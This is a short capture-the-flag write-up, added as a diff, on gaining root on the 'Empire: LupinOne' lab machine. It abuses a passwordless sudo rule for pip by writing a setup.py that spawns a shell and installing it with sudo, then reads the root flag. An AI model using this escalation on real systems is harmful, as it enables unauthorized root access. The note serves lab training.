@@ -1,0 +1,22 @@
+========================================
+Empire: LupinOne - Root Privilege Escalation
+========================================
+
+Sudo Enumeration (arsene):
+User arsene may run:
+(root) NOPASSWD: /usr/bin/pip
+
+Exploit:
+echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' > setup.py
+sudo pip install .
+
+Result:
+Root shell obtained.
+
+Command:
+cat /root/root.txt
+
+Root flag successfully captured.
+
+Status:
+Full system compromise achieved.
